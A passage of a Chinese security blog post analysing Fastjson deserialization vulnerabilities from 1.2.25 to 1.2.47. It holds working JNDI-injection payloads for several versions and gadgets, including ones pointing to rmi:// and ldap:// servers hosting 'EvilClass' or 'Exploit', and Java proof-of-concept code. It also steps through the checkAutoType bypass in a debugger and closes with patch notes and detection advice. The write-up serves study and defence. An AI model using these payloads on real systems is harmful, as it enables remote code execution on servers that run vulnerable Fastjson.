<p>然后就真相大白了，第二框会把<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>转换成<code>com.sun.rowset.JdbcRowSetImpl</code>，即成功绕过。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201114208247.png"></p>
<p>另外还有两种绕过方式，可以自行调试：</p>
<h5 id="1-2-25-1-2-42"><a href="#1-2-25-1-2-42" class="headerlink" title="1.2.25-1.2.42"></a>1.2.25-1.2.42</h5><p>适用于1.2.25-1.2.42</p>
<pre class="line-numbers language-none"><code class="language-none">{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://127.0.0.1:1099/EvilClass", "autoCommit":true}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="1-2-25-1-2-43"><a href="#1-2-25-1-2-43" class="headerlink" title="1.2.25-1.2.43"></a>1.2.25-1.2.43</h5><p>笔者此处还圈出了第一个框，它是另一种绕过方式，payload如下，适用于1.2.25-1.2.43版本。第一个逗号之前之所以多了两个符号<code>[{</code>，是因为该利用链在反序列化过程中涉及到一些其他判断需要绕过。具体调试可以尝试去掉这两个符号<code>[{</code>，执行代码观察报错</p>
<pre class="line-numbers language-none"><code class="language-none">{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"rmi://127.0.0.1:1099/EvilClass", "autoCommit":true}

{"@type":"[com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h5 id="1-2-25-1-2-45"><a href="#1-2-25-1-2-45" class="headerlink" title="1.2.25-1.2.45"></a>1.2.25-1.2.45</h5><p>适用于1.2.25-1.2.45，需要存在mybatis的jar包，且其版本需为3.x.x系列&lt;3.5.0的版本</p>
<pre class="line-numbers language-none"><code class="language-none">{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://127.0.0.1:1099/EvilClass"}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="hash黑名单"><a href="#hash黑名单" class="headerlink" title="hash黑名单"></a>hash黑名单</h5><p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
<p>通过对黑名单的研究，我们可以找到具体版本有哪些利用链可以利用。例如<code>Fastjson &lt; 1.2.66</code>：</p>
<p>基于黑名单绕过，autoTypeSupport属性true才能使用，在1.2.25版本之后，autoTypeSupport默认为false。</p>
<pre class="line-numbers language-none"><code class="language-none">{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://ip:1389/Calc"}{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://ip:1389/Calc"}{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://ip:1389/Calc"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="反序列化漏洞（二）——1-2-25-1-2-47"><a href="#反序列化漏洞（二）——1-2-25-1-2-47" class="headerlink" title="反序列化漏洞（二）——1.2.25-1.2.47"></a>反序列化漏洞（二）——1.2.25-1.2.47</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Fastjson 1.2.25-1.2.47版本</p>
<p>利用链基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191</p>
<p>此漏洞也可以理解为是一种绕过思路，绕过的大体思路是通过<code>java.lang.Class</code>，将<code>com.sun.rowset.JdbcRowSetImpl</code>类加载到Map缓存中，从而绕过AutoType的检测。然后再通过<code>com.sun.rowset.JdbcRowSetImpl</code>执行恶意RMI链接。payload如下：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"a"</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
        <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"b"</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
        <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1099/EvilClass"</span><span class="token punctuation">,</span>
        <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到实际上还是利用了<code>com.sun.rowset.JdbcRowSetImpl</code>这条利用链来攻击利用的，因此除了JDK版本外几乎没有其它限制。</p>
<p>注意，这个payload根据AutoTypeSupport模式的不同，能影响的版本也不同：</p>
<p>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</p>
<p>1.2.33-1.2.47版本：无论是否开启AutoTypeSuppt，都能成功利用；</p>
<p><strong>注意，下面都是在1.2.41版本做的调试</strong></p>
<h3 id="不开启AutoTypeSupport"><a href="#不开启AutoTypeSupport" class="headerlink" title="不开启AutoTypeSupport"></a>不开启AutoTypeSupport</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">JdbcRowSetImpl_Exploit</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImpl_EXP</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token comment">//        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilClass\", \"autoCommit\":true}";</span>
        <span class="token class-name">String</span> payload  <span class="token operator">=</span> <span class="token string">"{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"</span>
                <span class="token operator">+</span> <span class="token string">"\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span>
                <span class="token operator">+</span> <span class="token string">"\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilClass\",\"autoCommit\":true}}"</span><span class="token punctuation">;</span>
        JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调试一下，我们直接进入<code>checkAutoType()</code>函数，由于autoTypeSupport为false，所以不会进入第一个白名单，继续往下调试</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201140116727.png"></p>
<p>由于此时typeName为<code>java.lang.Class</code>，会在<code>this.deserializers.findClass(typeName)</code>函数中直接被找到，之后<code>clazz</code>不为空，所以不会经过第二个黑名单就会被返回。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201140830984.png"></p>
<p>返回到<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>函数，跟进<code>deserialze()</code>函数</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201140958963.png"></p>
<p>进去后会对val进行判空，然后继续执行解析出<code>com.sun.rowset.JdbcRowSetImpl</code>并赋值给<code>objVal</code>，往下执行</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201141219432.png" style="zoom:80%;">

<p>然后赋值给<code>strVal</code>变量，往下执行</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201141511436.png" style="zoom:80%;">

<p>接着判断clazz是否为class类，是的话调用<code>TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())</code>加载strVal指定的类，跟进<code>loadClass()</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201141810948.png"></p>
<p>在<code>loadClass()</code>里面，成功加载<code>com.sun.rowset.JdbcRowSetImpl</code>后，会放进map中作为缓存</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201141939523.png"></p>
<p>在遍历第二部分json数据时，依然会进入<code>checkAutoType()</code>函数，此时可以通过<code>TypeUtils.getClassFromMapping(typeName)</code>函数获取到刚才在map中缓存的<code>com.sun.rowset.JdbcRowSetImpl</code>，于是clazz就有了值，可以直接绕过第二次黑白名单判断，直接返回，从而成功绕过<code>checkAutoType()</code>的检测造成JNDI注入。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201142313798.png"></p>
<h3 id="开启AutoTypeSupport"><a href="#开启AutoTypeSupport" class="headerlink" title="开启AutoTypeSupport"></a>开启AutoTypeSupport</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">JdbcRowSetImpl_Exploit</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImpl_EXP</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilClass\", \"autoCommit\":true}";</span>
        <span class="token class-name">String</span> payload  <span class="token operator">=</span> <span class="token string">"{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"</span>
                <span class="token operator">+</span> <span class="token string">"\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span>
                <span class="token operator">+</span> <span class="token string">"\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilClass\",\"autoCommit\":true}}"</span><span class="token punctuation">;</span>
        JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>满足版本的情况下，也能执行成功，来看一下关键的绕过代码</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201145825818.png"></p>
<p>在判断<code>java.lang.Class</code>的时候，跟前面步骤一样，会将<code>com.sun.rowset.JdbcRowSetImpl</code>加入缓存；关键在于遍历第二个json，即<code>com.sun.rowset.JdbcRowSetImpl</code>时，是怎么绕过黑名单的？<br>看下面关键判断语句，发现第一个条件是为true的，因为<code>com.sun.rowset.JdbcRowSetImpl</code>在黑名单中，但是第二个判断条件为false，因为<code>com.sun.rowset.JdbcRowSetImpl</code>在map缓存中是找得到的，从而导致这个黑名单判断语句失效。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>accept<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>为什么1.2.25-1.2.32版本开启AutoTypeSupport反而不能成功触发？</strong></p>
<p>对比发现正是因为这个判断位置不一样，少了个判断条件，即<code>TypeUtils.getClassFromMapping(typeName) == null</code></p>
<h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><p>针对上述问题，<code>1.2.48</code>中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。</p>
<h4 id="safeMode加固"><a href="#safeMode加固" class="headerlink" title="safeMode加固"></a>safeMode加固</h4><p>Fastjson在1.2.68及之后的版本中引入了safeMode，配置safeMode后，无论白名单和黑名单，都不支持autoType，可杜绝反序列化Gadgets类变种攻击。开启safeMode是完全关闭autoType功能，可能会有兼容问题。</p>
<p>具体参考：<a href="https://github.com/alibaba/fastjson/wiki/security_update_20220523">https://github.com/alibaba/fastjson/wiki/security_update_20220523</a></p>
<p>目前2022年5月23日发布的Fastjson 1.2.83是1.x系列的最后一个版本</p>
<p>从2022年4月17日开始，Fastjson也进入了2.0时代。</p>
<h2 id="高版本JDK绕过思路"><a href="#高版本JDK绕过思路" class="headerlink" title="高版本JDK绕过思路"></a>高版本JDK绕过思路</h2><p>由之前利用的PoC知道，利用范围最广的PoC是基于<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链的，而这种利用方式是基于JNDI注入漏洞的，是需要我们有RMI服务或LDAP服务。</p>
<p>这样就会导致一个限制的问题，即JNDI注入漏洞利用的限制问题——JDK版本。</p>
<p>由之前的分析知道，JDK对于JNDI注入漏洞在不同版本有着不同的防御措施：</p>
<ul>
<li>JDK 6u45、7u21之后：<code>java.rmi.server.useCodebaseOnly</code>的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的<code>java.rmi.server.codebase</code>指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li>
<li>JDK 6u141、7u131、8u121之后：增加了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li>
<li>JDK 6u211、7u201、8u191之后：增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li>
</ul>
<p>因此，相比之下，我们在Fastjson反序列化漏洞的基于<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链上，更倾向于使用LDAP服务来实现攻击利用，因为其对于JDK的适用范围更广。</p>
<p>但是如果目标环境的JDK版本在6u211、7u201、8u191之后，我们是不是就没有办法绕过了呢？</p>
<p>当然是有的，参考：<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">如何绕过高版本JDK的限制进行JNDI注入利用</a></p>
<p>主要是有两种方式：</p>
<ul>
<li>利用本地Class作为Reference Factory</li>
<li>利用LDAP返回序列化数据，触发本地Gadget</li>
</ul>
<p>具体可参考另一篇文章：<a href="http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/">浅析高低版JDK下的JNDI注入及绕过</a></p>
<h2 id="检测思路"><a href="#检测思路" class="headerlink" title="检测思路"></a>检测思路</h2><h3 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h3><p>全局搜索是否使用到了Fastjson，若使用了则进一步排查是否为漏洞版本号即1.2.22-1.2.47，若是则可能存在反序列化漏洞的风险，需进一步排查。</p>
<p>全局搜索如下关键代码，若存在则进一步排查参数是否外部可控：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>
JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h3><p>1.HTTP请求包如果是JSON格式的数据，就有可能是Fastjson。</p>
<p>2.抓到包以后，将请求方法改为POST；请求头部<code>Content-Type</code>字段修改为<code>Content-Type: application/json</code>；如下删除json格式包的一半，观察报错是否有fastjson之类的特征。</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
<span class="token property">"name"</span><span class="token operator">:</span>"<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>3.<code>java.net.InetAddress</code>这个类在实例化时会尝试作对example.com做域名解析，这时候可以通过dnslog的方式得知漏洞是否存在。</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.net.InetAddress"</span><span class="token punctuation">,</span>
        <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"i1q73g.dnslog.cn"</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Fastjson系列：<a href="http://www.mi1k7ea.com/archives/2019/">http://www.mi1k7ea.com/archives/2019/</a></p>
<p>Fastjson反序列化漏洞的调试与分析：<a href="https://blog.csdn.net/qq_34101364/article/details/111706189">https://blog.csdn.net/qq_34101364/article/details/111706189</a></p>
<p>Fastjson系列-漏洞复现：<a href="https://www.freebuf.com/vuls/358459.html">https://www.freebuf.com/vuls/358459.html</a></p>
<p>Fastjson不出网利用总结：<a href="https://xz.aliyun.com/t/12492">https://xz.aliyun.com/t/12492</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
        <category>细读经典</category>
      </categories>
      <tags>
        <tag>JNDI注入</tag>
        <tag>Fastjson</tag>
      </tags>
  </entry>
</search>
